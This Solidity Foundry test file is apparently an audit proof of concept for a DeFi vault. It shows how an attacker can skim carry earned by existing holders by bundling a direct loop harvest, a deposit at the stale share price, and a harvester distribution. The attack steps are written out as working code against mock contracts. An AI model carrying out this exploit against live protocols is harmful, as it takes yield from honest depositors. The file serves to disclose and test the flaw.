// SPDX-License-Identifier: MIT
pragma solidity ^0.8.22;

import {Test} from "forge-std/Test.sol";
import {ERC1967Proxy} from "@openzeppelin/contracts/proxy/ERC1967/ERC1967Proxy.sol";
import {CollateralVault} from "../src/CollateralVault.sol";
import {RoundingReserveFixture} from "./helpers/RoundingReserveFixture.sol";
import {SubLoop} from "../src/SubLoop.sol";
import {SyntheticToken} from "../src/SyntheticToken.sol";
import {Harvester} from "../src/Harvester.sol";
import {PropellerFeeController} from "../src/PropellerFeeController.sol";
import {DcaDispatch} from "../src/lib/DcaDispatch.sol";
import {MockERC20} from "./mocks/MockERC20.sol";
import {MockPool} from "./mocks/MockPool.sol";
import {MockDispatch} from "./mocks/MockDispatch.sol";
import {MockSwapper} from "./mocks/MockSwapper.sol";

/// @notice PoC for the historical-carry-capture finding
///         (`propeller-how-it-works.md` → "direct harvest lets a new depositor
///         capture historical carry", SubLoop.sol:508-541, Harvester.sol:104-139).
///
///         Anyone can call `SubLoop.harvest()` directly: it removes the surplus
///         PRIME (carry earned by EXISTING holders) from the loop and parks it
///         in the Harvester. The later `Harvester.harvest()` distributes the
///         Harvester's ENTIRE parked PRIME balance using loop-share weights at
///         THAT LATER MOMENT — not the weights from when the carry was earned.
///
///         Attack (one atomic bundle):
///           1. attacker calls `SubLoop.harvest()`      → carry parked, loop NAV drops
///           2. attacker deposits into the vault        → fresh shares minted at the
///              pre-carry price (parked PRIME is not in totalAssets / loop NAV)
///           3. attacker calls `Harvester.harvest()`    → parked carry compounds into
///              the vault, raising the share price the attacker just bought into
///
///         The attacker walks away with ~their weight × the carry that was
///         earned entirely by the honest holder's position. Existing holders
///         cannot react: the three calls bundle atomically.
contract CarryCapturePocTest is Test {
    MockERC20 eth;
    MockERC20 aEth;
    MockERC20 ethDebt;
    MockERC20 hollar;
    MockERC20 aHollar;
    MockERC20 hollarDebt;
    MockERC20 prime;
    MockERC20 aPrime;
    MockERC20 primeDebt;
    MockERC20 aSynth;
    MockERC20 synthDebt;

    MockPool pool;
    MockSwapper swapper;
    SyntheticToken synth;
    SubLoop loop;
    CollateralVault vault;
    Harvester harvester;
    PropellerFeeController fees;

    address honest = makeAddr("honest");
    address attacker = makeAddr("attacker");

    /// simulated PRIME yield accruing to the loop (USD, 6dp aPRIME)
    uint256 constant CARRY = 60e6; // $60 on a ~$2.2k seed

    function setUp() public {
        eth = new MockERC20("ETH", "ETH", 18);
        aEth = new MockERC20("aETH", "aETH", 18);
        ethDebt = new MockERC20("dETH", "dETH", 18);
        hollar = new MockERC20("HOLLAR", "HOLLAR", 18);
        aHollar = new MockERC20("aHOLLAR", "aHOLLAR", 18);
        hollarDebt = new MockERC20("dHOLLAR", "dHOLLAR", 18);
        prime = new MockERC20("PRIME", "PRIME", 6);
        aPrime = new MockERC20("aPRIME", "aPRIME", 6);
        primeDebt = new MockERC20("dPRIME", "dPRIME", 6);
        synth = new SyntheticToken("Propeller Synthetic", "psHOLLAR", address(this));
        aSynth = new MockERC20("aSYNTH", "aSYNTH", 18);
        synthDebt = new MockERC20("dSYNTH", "dSYNTH", 18);

        pool = new MockPool();
        pool.initReserve(address(eth), address(aEth), address(ethDebt), 8500, 7500, 18, 3_000e18);
        pool.initReserve(address(hollar), address(aHollar), address(hollarDebt), 0, 0, 18, 1e18);
        pool.initReserve(address(prime), address(aPrime), address(primeDebt), 8800, 8500, 6, 1e18);
        pool.initReserve(address(synth), address(aSynth), address(synthDebt), 9800, 100, 18, 1e18);

        swapper = new MockSwapper(address(pool));

        loop = SubLoop(
            address(
                new ERC1967Proxy(
                    address(new SubLoop()),
                    abi.encodeCall(
                        SubLoop.initialize,
                        (address(pool), address(hollar), address(prime), address(aPrime), 1.05e18, 1.10e18, address(this))
                    )
                )
            )
        );
        vault = CollateralVault(
            address(
                new ERC1967Proxy(
                    address(new CollateralVault()),
                    abi.encodeCall(
                        CollateralVault.initialize,
                        (
                            "Propeller ETH", "pETH", address(eth), address(pool), address(loop),
                            address(swapper), address(hollar), address(synth), address(aEth),
                            address(hollarDebt), 1_000e18, address(this)
                        )
                    )
                )
            )
        );
        harvester = new Harvester(address(loop), address(prime), address(this));

        vm.etch(DcaDispatch.DISPATCH, address(new MockDispatch()).code);
        MockDispatch(payable(DcaDispatch.DISPATCH)).configure(address(pool), address(hollar), address(prime), 222, 1043);
        loop.configureDca(222, 43, 1043, 143, 10_000);

        synth.grantRole(synth.MINTER_ROLE(), address(vault));
        RoundingReserveFixture.fund(vault);
        loop.registerVault(address(vault));
        loop.setHarvester(address(harvester));
        loop.setTranches(10_000_000e18, 10_000_000e6);
        vault.setCompoundSlippageBps(100);
        harvester.addVault(address(vault));
        fees = new PropellerFeeController(address(this), address(0xFEE));
        harvester.setFeeController(address(fees));
        vault.setFeeController(address(fees));
        fees.registerVault(address(vault), address(harvester));
    }

    function _depositAs(address who, uint256 amount) internal returns (uint256 shares) {
        eth.mint(who, amount);
        vm.startPrank(who);
        eth.approve(address(vault), amount);
        shares = vault.deposit(amount, who);
        vm.stopPrank();
    }

    function _valueOf(address who) internal view returns (uint256) {
        return vault.convertToAssets(vault.balanceOf(who));
    }

    /// ── PoC: skim → deposit → distribute, atomically ──────────────────────
    function test_poc_newDepositorCapturesHistoricalCarry() public {
        // bootstrap (governance-only first deposit), then the honest holder
        eth.mint(address(this), 0.01e18);
        eth.approve(address(vault), 0.01e18);
        vault.deposit(0.01e18, address(this));
        _depositAs(honest, 1e18);
        for (uint256 i = 0; i < 40; i++) loop.pokeBorrow();

        // carry accrues to the loop — earned 100% by the CURRENT holders
        aPrime.mint(address(loop), CARRY);
        uint256 honestBefore = _valueOf(honest);

        // ── control: nobody attacks, the keeper harvests honestly ─────────
        uint256 snap = vm.snapshot();
        uint256[] memory minOuts = new uint256[](1);
        harvester.harvest(minOuts);
        uint256 honestGainControl = _valueOf(honest) - honestBefore;
        emit log_named_decimal_uint("control: honest gain from own carry (ETH)", honestGainControl, 18);
        assertGt(honestGainControl, 0, "control: carry reaches the honest holder");
        vm.revertTo(snap);

        // ── attack: three permissionless calls, one atomic bundle ─────────
        vm.startPrank(attacker);
        loop.harvest(); // 1. park the honest holder's carry in the Harvester
        vm.stopPrank();
        assertApproxEqAbs(prime.balanceOf(address(harvester)), CARRY, 1e3, "carry parked, loop NAV dropped");

        _depositAs(attacker, 9e18); // 2. buy in at the pre-carry share price

        vm.prank(attacker);
        harvester.harvest(minOuts); // 3. distribute parked carry by TODAY's weights

        // ── who got the carry? ────────────────────────────────────────────
        uint256 honestGainAttack = _valueOf(honest) - honestBefore;
        uint256 attackerGain = _valueOf(attacker) - 9e18;
        emit log_named_decimal_uint("attack: honest gain (ETH)", honestGainAttack, 18);
        emit log_named_decimal_uint("attack: attacker gain (ETH)", attackerGain, 18);

        // attacker deposited 9 ETH against ~1.01 ETH of honest+bootstrap value,
        // so ~90% of the parked carry lands on shares minted AFTER it was earned
        assertGt(attackerGain, (honestGainControl * 80) / 100, "attacker captures >80% of the carry");
        assertLt(honestGainAttack, (honestGainControl * 20) / 100, "honest holder keeps <20% of their own carry");
    }

    /// ── sanity: the skim alone moves real value out of the loop ───────────
    function test_poc_directSkimParksCarryBeforeDistribution() public {
        eth.mint(address(this), 0.01e18);
        eth.approve(address(vault), 0.01e18);
        vault.deposit(0.01e18, address(this));
        _depositAs(honest, 1e18);
        for (uint256 i = 0; i < 40; i++) loop.pokeBorrow();
        aPrime.mint(address(loop), CARRY);

        uint256 equityBefore = loop.totalEquity();
        vm.prank(attacker); // no role needed — anyone can skim
        loop.harvest();

        assertApproxEqAbs(prime.balanceOf(address(harvester)), CARRY, 1e3, "full surplus parked in the Harvester");
        assertApproxEqAbs(loop.totalEquity(), equityBefore - CARRY * 1e2, 1e6, "loop NAV dropped by the skim");
        // and it sits there, undistributed, until ANY later caller runs
        // Harvester.harvest with whatever the share weights are then
    }
}
